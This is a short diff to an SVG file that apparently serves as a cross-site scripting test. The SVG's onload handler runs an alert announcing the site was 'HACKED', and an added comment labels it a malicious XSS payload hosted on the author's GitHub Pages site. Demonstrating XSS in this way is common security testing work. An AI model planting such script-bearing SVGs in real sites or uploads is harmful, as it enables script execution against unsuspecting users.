@@ -1,2 +1,4 @@
+// SVG malicious file with XSS payload on my site : https://ziademad2024.github.io/xsstest/xss.svg
+
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS from SVG You Got HACKED by Ziad Emad hehehehehehe')">
 </svg>
